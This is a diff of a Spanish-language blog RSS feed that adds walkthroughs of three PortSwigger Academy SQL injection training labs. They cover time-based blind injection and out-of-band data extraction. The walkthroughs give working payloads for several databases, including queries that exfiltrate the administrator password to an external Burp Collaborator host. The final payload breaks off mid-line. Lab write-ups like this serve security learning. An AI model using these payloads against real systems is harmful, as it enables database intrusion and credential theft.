@@ -6,7 +6,312 @@
         <description>Recent content on A1ux</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>es-GT</language>
-        <lastBuildDate>Mon, 08 Nov 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://www.alux.cc/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Thu, 11 Nov 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://www.alux.cc/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Portswigger Academy Learning Path: SQL Injection Lab 14</title>
+        <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-14/</link>
+        <pubDate>Thu, 11 Nov 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-14/</guid>
+        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-14/head.png" alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 14" /&gt;&lt;h1 id=&#34;lab-blind-sql-injection-with-time-delays&#34;&gt;Lab: Blind SQL injection with time delays&lt;/h1&gt;
+&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder explotar una vulnerabilidad de sql injection pero basandose en tiempo, la cual se utilizara posteriormente para poder extraer los datos del usuario y contrasena de la tabla usuers.&lt;/p&gt;
+&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
+&lt;p&gt;Basandonos en la siguiente &lt;!-- raw HTML omitted --&gt;lista&lt;sup id=&#34;fnref:2&#34;&gt;&lt;a href=&#34;#fn:2&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;2&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt; encontramos que inyectando la siguiente consulta podemos ejecutar un delay, sabiendo que la aplicacion es backend &lt;code&gt;postgresql&lt;/code&gt;.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;xxxxxxxxx&#39; AND 1337=(SELECT 1337 FROM PG_SLEEP(10)) AND &#39;1337&#39;=&#39;1337 //inyectar esto no dejara ejecutar conditional time delay
+xxxxxxxxx&#39;%3BSELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END-- //%3B para no tener conflicto en repeater al colocar &#39;;&#39; en la cookie
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Podemos inyectar las siguientes consultas para crearla:&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Backend&lt;/th&gt;
+&lt;th&gt;Consulta SQL&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;Oracle&lt;/td&gt;
+&lt;td&gt;SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN &amp;lsquo;a&amp;rsquo;||dbms_pipe.receive_message((&amp;lsquo;a&amp;rsquo;),10) ELSE NULL END FROM dual&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Microsoft&lt;/td&gt;
+&lt;td&gt;IF (YOUR-CONDITION-HERE) WAITFOR DELAY &amp;lsquo;0:0:10&amp;rsquo;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;PostgreSQL&lt;/td&gt;
+&lt;td&gt;SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;MySQL&lt;/td&gt;
+&lt;td&gt;SELECT IF(YOUR-CONDITION-HERE,sleep(10),&amp;lsquo;a&amp;rsquo;)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;payloads&#34;&gt;Payloads&lt;/h3&gt;
+&lt;p&gt;Ahora toca crear una consulta para extraer los valores de la contrasena de la tabla &lt;code&gt;users&lt;/code&gt;, creando la siguiente consulta, sabiendo que es &lt;code&gt;postgresql&lt;/code&gt;. Como en los anteriores sabemos que son 20 caracteres en este caso vamos a utilizar la siguiente consulta, utilizando clusterbomb, el primero como valor numero de 1 a 20 y el 2 con una lista de caracteres alfanumericos.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;%3BSELECT CASE WHEN (username=&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;administrator&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; and substr(password,&amp;lt;valor cambiante 1 a 20&amp;gt;,1)=&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;valor&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;alfanumerico&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;) THEN pg_sleep(10) ELSE pg_sleep(0) END from users--
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 235; 
+			flex-basis: 565px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-14/intruder.png&#34; data-size=&#34;1340x569&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-14/intruder.png&#34;
+			width=&#34;1340&#34;
+			height=&#34;569&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-14/intruder_hua3bb1f5623a1881c7205a7d61c173e1d_61681_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-14/intruder_hua3bb1f5623a1881c7205a7d61c173e1d_61681_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Ataque con intruder&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Ataque con intruder&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Y con esto ya tenemos la contrasena del usuario &lt;code&gt;administrator&lt;/code&gt; que es &lt;code&gt;ifp6pjrl8u4oy2xp9e3b&lt;/code&gt;. Y algo a tomar en cuenta es al hacer inyecciones de este tipo, la respuesta de las peticiones al hacerse juntas la respuesta tardara igual en todas, asi que lo justo es no enviar en hilos ya que no sabremos cual sera la respuesta que tarde mas ya que se replicara en varias respuestas.&lt;/p&gt;
+&lt;h4 id=&#34;extraer-datos&#34;&gt;Extraer datos&lt;/h4&gt;
+&lt;p&gt;Y con esto hemos resulto el lab:&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 205; 
+			flex-basis: 493px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-14/resuelto.png&#34; data-size=&#34;1762x857&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-14/resuelto.png&#34;
+			width=&#34;1762&#34;
+			height=&#34;857&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-14/resuelto_hu0900f70a950cadf08f43b3a81f97008f_97050_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-14/resuelto_hu0900f70a950cadf08f43b3a81f97008f_97050_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Laboratorio resuelto&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Con esto ya muestra que se ha resuelto el lab.&lt;/p&gt;
+&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
+&lt;hr&gt;
+&lt;ol&gt;
+&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&#34;fn:2&#34; role=&#34;doc-endnote&#34;&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;lista.txt&#34; &gt;Lista de Payloads SQL Injection Time Based&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:2&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/section&gt;
+</description>
+        </item>
+        <item>
+        <title>Portswigger Academy Learning Path: SQL Injection Lab 15</title>
+        <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-15/</link>
+        <pubDate>Thu, 11 Nov 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-15/</guid>
+        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-15/head.png" alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 15" /&gt;&lt;h1 id=&#34;lab-blind-sql-injection-with-out-of-band-interaction&#34;&gt;Lab: Blind SQL injection with out-of-band interaction&lt;/h1&gt;
+&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder inyectar una consulta sql y basandonos en la ejecucion que pueda realizar el backend una consulta hacia un endpoint y genere una accion, en este caso de esto se trata. Mas que todo donde los otros tipos de sql injection a ciegas no puede llegar.&lt;/p&gt;
+&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
+&lt;p&gt;Burpsuite cuenta con una propia herramienta que es Burp Collaborator que lo que hace es apoyar a detectar vulnerabilidades a ciegas. Pero si no se cuenta con Burpsuite Pro no se puede utilizar, asi que se listan a continuacion algunas alternativas para poder explotar esta vulnerabilidad.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;En el laboratorio no se puede realizar alguna de estas alternativas ya que el firewall de PortswiggerAcademy bloquea&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;http://dnslog.cn/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://dnslog.cn/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://webhook.site/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://webhook.site/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://app.interactsh.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://app.interactsh.com/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;http://pingb.in/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://pingb.in/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;http://swin.es/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://swin.es/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;http://ceye.io/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://ceye.io/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://canarytokens.org/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://canarytokens.org/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://requestbin.net/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://requestbin.net/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://beeceptor.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://beeceptor.com/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;payloads&#34;&gt;Payloads&lt;/h3&gt;
+&lt;p&gt;Los payloads a inyectar segun la base de datos son los siguientes:&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Backend&lt;/th&gt;
+&lt;th&gt;Consulta&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;Oracle&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;SELECT extractvalue(xmltype(&#39;\&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;\&amp;lt;!DOCTYPE root [ \&amp;lt;!ENTITY % remote SYSTEM &amp;quot;http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/&amp;quot;&amp;gt; %remote;]&amp;gt;&#39;),&#39;/l&#39;) FROM dual&lt;/code&gt; o &lt;code&gt;SELECT UTL_INADDR.get_host_address(&#39;YOUR-SUBDOMAIN-HERE.burpcollaborator.net&#39;)&lt;/code&gt; solo con privilegios elevados&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Microsoft&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;exec master..xp_dirtree &#39;//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a&#39;&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;PostgreSQL&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;copy (SELECT &#39;&#39;) to program &#39;nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net&#39;&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;MySQL&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;LOAD_FILE(&#39;\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a&#39;)&lt;/code&gt; solo trabaja en windows o &lt;code&gt;SELECT ... INTO OUTFILE &#39;\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a&#39;&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h4 id=&#34;explotar&#34;&gt;Explotar&lt;/h4&gt;
+&lt;p&gt;Utilizando una de las consultas podemos inyectar una consulta y enviar la consulta, y ahora collaborate nos enviara las peticiones que se han realizado.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;xxxxxxxxxxxxxxxx&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;+UNION+SELECT+EXTRACTVALUE(xmltype(&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fxml&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;encoding&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;lt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DOCTYPE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;root&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&amp;lt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ENTITY&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;25&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SYSTEM&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http%3a//gcwtmppkxyte3s4zwxzqbfkig9mba0.burpcollaborator.net/&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;+%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;25&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;),&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;)+FROM+dual--
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 143; 
+			flex-basis: 343px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-15/repeater.png&#34; data-size=&#34;1539x1075&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-15/repeater.png&#34;
+			width=&#34;1539&#34;
+			height=&#34;1075&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-15/repeater_hu5decb89ea607d037ca51e48705c853ff_151973_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-15/repeater_hu5decb89ea607d037ca51e48705c853ff_151973_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Envio de consulta con repeater&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Envio de consulta con repeater&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Y con esto hemos resulto el lab:&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 217; 
+			flex-basis: 523px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-15/resuelto.png&#34; data-size=&#34;1761x808&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-15/resuelto.png&#34;
+			width=&#34;1761&#34;
+			height=&#34;808&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-15/resuelto_hudb1d6fd86e50b409045069c012032baa_103793_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-15/resuelto_hudb1d6fd86e50b409045069c012032baa_103793_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Laboratorio resuelto&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Con esto ya muestra que se ha resuelto el lab.&lt;/p&gt;
+&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
+&lt;hr&gt;
+&lt;ol&gt;
+&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/section&gt;
+</description>
+        </item>
+        <item>
+        <title>Portswigger Academy Learning Path: SQL Injection Lab 16</title>
+        <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-16/</link>
+        <pubDate>Thu, 11 Nov 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-16/</guid>
+        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-16/head.png" alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 16" /&gt;&lt;h1 id=&#34;lab-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft&#34;&gt;Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft&lt;/h1&gt;
+&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder extraer la contrasena del usuario &amp;lsquo;administrator&amp;rsquo; en la tabla &amp;lsquo;users&amp;rsquo;. Para este caso haciendo uso de la exfiltracion de la propia base de datos para que se conecte a nuestro host y ahi captura lo que es enviado en la url.&lt;/p&gt;
+&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
+&lt;p&gt;Lo primero es saber que tipo de payloads podemos usar para ejecutar la consulta que deseamos, y se encuentran las siguientes:&lt;/p&gt;
+&lt;hr&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Backend&lt;/th&gt;
+&lt;th&gt;Consulta&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;Oracle&lt;/td&gt;
+&lt;td&gt;SELECT extractvalue(xmltype(&#39;&amp;lt;?xml version=&amp;ldquo;1.0&amp;rdquo; encoding=&amp;ldquo;UTF-8&amp;rdquo;?&amp;gt;&amp;lt;!DOCTYPE root [ &amp;lt;!ENTITY % remote SYSTEM &amp;ldquo;http://&#39;||(SELECT YOUR-QUERY-HERE)||&#39;.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/&amp;quot;&amp;gt; %remote;]&amp;gt;&#39;),&#39;/l&#39;) FROM dual&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Microsoft&lt;/td&gt;
+&lt;td&gt;declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec(&amp;lsquo;master..xp_dirtree &amp;ldquo;//&#39;+@p+&#39;.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a&amp;rdquo;&#39;)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;PostgreSQL&lt;/td&gt;
+&lt;td&gt;create OR replace function f() returns void as $$ declare c text; declare p text; begin SELECT into (SELECT YOUR-QUERY-HERE); c := &amp;lsquo;copy (SELECT &amp;lsquo;&#39;&#39;&#39;) to program &amp;lsquo;&amp;lsquo;nslookup &amp;lsquo;||p||&#39;.YOUR-SUBDOMAIN-HERE.burpcollaborator.net&amp;rsquo;&#39;&#39;;execute c; END; $$ language plpgsql security definer; SELECT f();&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;MySQL&lt;/td&gt;
+&lt;td&gt;SELECT YOUR-QUERY-HERE INTO OUTFILE &amp;lsquo;\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a&amp;rsquo; &lt;em&gt;solo funciona en windows&lt;/em&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;payloads&#34;&gt;Payloads&lt;/h3&gt;
+&lt;p&gt;Ahora toca saber cual es el payload correcto para poder resolver el lab, probando de uno en uno llegamos a cual es el correcto, asi que probaremos con Oracle el cual termino siendo el correcto y evitarnos probar cada uno del resto, la consulta ejecutada fue:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;xxxxxxxxxxxx&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; UNION SELECT extractvalue(xmltype(&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;xml&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;encoding&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;?&amp;gt;&amp;lt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DOCTYPE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;root&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ENTITY&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SYSTEM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://&amp;#39;||(SELECT password from users where username=&amp;#39;administrator&amp;#39;)||&amp;#39;.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;),&amp;#39;&lt;/span&gt;&lt;span 